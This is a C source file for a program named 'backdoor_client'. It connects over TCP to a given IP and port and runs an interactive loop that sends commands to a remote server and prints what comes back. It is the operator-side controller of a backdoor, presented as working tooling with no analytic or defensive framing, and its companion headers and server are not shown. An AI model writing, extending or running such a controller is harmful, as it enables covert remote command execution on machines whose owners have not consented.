#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include "debug.h"
#include "comms.h"
#include "cmd.h"

// Communicates with the server and sends commands.
void communicate() {
    char *cmd;

    // Loop until the client no longer wants to send commands
    printf("Connection established. You can now send commands to the server.\n");
    do {
        cmd = send_cmd();
        process_cmd(cmd);
        if(cmd != NULL && cmd[0] != 0) {
            get_output();
        }
    } while(check_exit(cmd));
}

// Main function
int main(int argc, char **argv) {
    struct sockaddr_in serv_addr; // Contains server socket information
    char *ip; // The IP address to connect to
    int port; // The port to connect to
    int fd; // Descriptor for the server socket that we will read/write to

    // Parse the arguments
    if(argc != 3) {
        printf("Usage: ./backdoor_client <ip> <port>\n");
        exit(0);
    }
    ip = argv[1];
    port = atoi(argv[2]);

    // Create the socket
    debug_print("Creating socket...\n");
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd < 0) {
        debug_err("Error in socket()");
        exit(1);
    }

    // Create the server socket information
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if(inet_pton(AF_INET, ip, &(serv_addr.sin_addr)) <= 0) {
        debug_print("Invalid IP address.\n");
        exit(1);
    }

    // Connect to the server
    debug_print("Connecting to server...\n");
    if(connect(fd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        debug_err("Error in connect()");
        exit(1);
    } else {
        comms_fd(fd);
        communicate(fd);
    }

    debug_print("Ending connection...\n");
    close(fd);
    return 0;
}
